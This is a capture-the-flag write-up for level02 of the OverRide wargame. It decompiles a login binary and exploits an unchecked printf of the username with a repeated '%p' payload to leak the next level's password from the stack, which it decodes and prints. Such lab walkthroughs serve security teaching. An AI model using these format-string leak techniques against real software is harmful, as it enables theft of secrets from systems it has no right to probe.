# Level 02

Once logged in, you will see a binary.

```
$ ssh localhost -p 4444 -l level02
	   ____                  ____  _     __
	  / __ \_   _____  _____/ __ \(_)___/ /__
	 / / / / | / / _ \/ ___/ /_/ / / __  / _ \
	/ /_/ /| |/ /  __/ /  / _, _/ / /_/ /  __/
	\____/ |___/\___/_/  /_/ |_/_/\__,_/\___/

                       Good luck & Have fun

   To start, ssh with level00/level00 on localhost:4242
level02@localhost's password:

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level02/level02

level02@OverRide:~$ls
level02
level02@OverRide:~$
```

Let's run the program.

```
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: aaaaaaaaaaaaaa
--[ Password: bbbbbbbbbbbbbbbbbbbb
*****************************************
aaaaaaaaaaaaaa does not have access!
level02@OverRide:~$
```

By decompiling the source code (with [Hopper](https://www.hopperapp.com/) this time), it first opens the file of the token of level 3, and asks for input from the user. (Apparently this program doesn't seem to check whether the username is correct or not.) If the input doesn't match with the content of the password (the flag for level03), it will print out user name _directly from the user input_ before denying access.

```
	[...]

    puts("===== [ Secure Access System v1.0 ] =====");
    puts("/***************************************\");
    puts("| You must login to access this system. |");
    puts("\**************************************/");
    printf("--[ Username: ");
    // 0x64 = 100, stdin = 1
    fgets(&buffer_username, 0x64, stdin);    // <- here is the part taking input from stdin

	....

	if (strncmp(&buffer_password_file, &buffer_password_input, 41) == 0) {
        printf("Greetings, %s!\n", &buffer_username);
        system("/bin/sh");
        return (0);
	} else {
	    printf(&buffer_username);              // <- here is the part prints the output
	    puts(" does not have access!");
	    exit(1);
	}

	[...]
```

Remember, if the format string is sent directly to the function `printf`, it can be made to print values from the memory (the stack), which a vulnerability.

Also, since the variables are declared on the stack, the values are stored next to each other, which means that we can easily print out the values.

```
	int main(int arg0, int arg1) {
		FILE	*fs;
		size_t	read_count;
		char	buffer_username[100];
		char	buffer_password_file[42];
		char	buffer_password_input[100];

		[...]
```

Let's try and see if the value can be printed. We'll use `%p`, instead of `%x`, which will print out the memory formatted as pointers. This will make it so that even if the memory has leading 0s, we will still get the full hex-formatted memory. (e.g. `0x0000000000000001`)

```
level02@OverRide:~$ python -c 'print "%p "*100 + "\n"' | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
0x7fffffffe4a0 (nil) (nil) 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe698 0x1f7ff9a08 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d 0x2c3000 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!
```

We now have the password value (but reverse endian-ness order): `0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d`

We wrote a quick script (with comments) to decode these hex memory values into the password that you can see at `Ressources/decode_password.py`.

```
$ python3 decode_password.py
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

Let's try the password we decoded.

```
level02@OverRide:~$ su level03
Password:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   /home/users/level03/level03
level03@OverRide:~$
```

Success!
